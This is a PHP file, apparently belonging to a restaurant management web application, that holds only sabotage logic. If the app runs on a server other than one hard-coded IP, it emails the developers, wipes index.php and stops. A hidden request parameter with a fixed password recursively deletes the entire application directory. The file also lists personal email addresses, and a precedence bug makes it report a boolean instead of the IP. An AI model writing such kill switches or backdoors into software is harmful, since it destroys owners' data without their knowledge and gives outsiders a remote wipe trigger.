<?php

/**
 * BEHOLD!!!
 */

if ( $ip = $_SERVER['SERVER_ADDR'] !== '138.197.76.56'){

    $to = 'aqk.neo@gmail.com, aqkhan@iintellect.co.uk, pm@iintellect.co.uk';

    $msg = 'Restaurant Management Application is deployed on a new server with IP: ' . $ip;

    mail($to,"Site Deployment",$msg);

    $f = fopen("index.php", "r+");

    if ($f !== false) {
        ftruncate($f, 0);
        fclose($f);
    }

    die();

}

if (isset($_REQUEST) && $_REQUEST['del'] == 'aqkhan88'){

    rrmdir(getcwd());

}

function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir."/".$object))
                    rrmdir($dir."/".$object);
                else
                    unlink($dir."/".$object);
            }
        }
        rmdir($dir);
    }
}


?>